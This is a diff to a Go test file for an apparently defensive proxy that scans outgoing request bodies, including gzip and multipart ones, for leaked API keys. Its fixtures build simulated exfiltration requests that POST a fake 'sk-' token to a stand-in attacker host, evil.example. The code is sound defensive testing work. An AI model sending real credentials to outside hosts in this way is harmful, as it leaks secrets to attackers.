@@ -1,6 +1,8 @@
 package proxy
 
 import (
+	"bytes"
+	"compress/gzip"
 	"io"
 	"net/http"
 	"strings"
@@ -27,13 +29,40 @@ func TestPeekRequestBodyRestores(t *testing.T) {
 	}
 }
 
-func TestPeekRequestBodySkipsBinary(t *testing.T) {
+func TestPeekRequestBodySkipsMedia(t *testing.T) {
 	req, err := http.NewRequest(http.MethodPost, "https://evil.example/", strings.NewReader("sk-denyouttest000000000000000"))
 	if err != nil {
 		t.Fatal(err)
 	}
-	req.Header.Set("Content-Type", "application/octet-stream")
+	req.Header.Set("Content-Type", "image/png")
 	if prefix := peekRequestBody(req, 65536); prefix != nil {
 		t.Fatalf("expected nil for binary, got %q", prefix)
+	}
+}
+
+func TestPeekRequestBodyScansMultipartOctetAndGzip(t *testing.T) {
+	const tok = "sk-denyouttest000000000000000"
+	for _, ct := range []string{"multipart/form-data; boundary=x", "application/octet-stream", "", "application/x-ndjson"} {
+		req, _ := http.NewRequest(http.MethodPost, "https://evil.example/", strings.NewReader(tok))
+		if ct != "" {
+			req.Header.Set("Content-Type", ct)
+		}
+		if got := peekRequestBody(req, 65536); !strings.Contains(string(got), tok) {
+			t.Errorf("content-type %q not scanned", ct)
+		}
+	}
+	var buf bytes.Buffer
+	zw := gzip.NewWriter(&buf)
+	_, _ = zw.Write([]byte(`{"k":"` + tok + `"}`))
+	_ = zw.Close()
+	req, _ := http.NewRequest(http.MethodPost, "https://evil.example/", bytes.NewReader(buf.Bytes()))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Content-Encoding", "gzip")
+	if got := peekRequestBody(req, 65536); !strings.Contains(string(got), tok) {
+		t.Error("gzip body not decoded for scan")
+	}
+	rest, _ := io.ReadAll(req.Body)
+	if !bytes.Equal(rest, buf.Bytes()) {
+		t.Error("wire body must stay unmodified")
 	}
 }
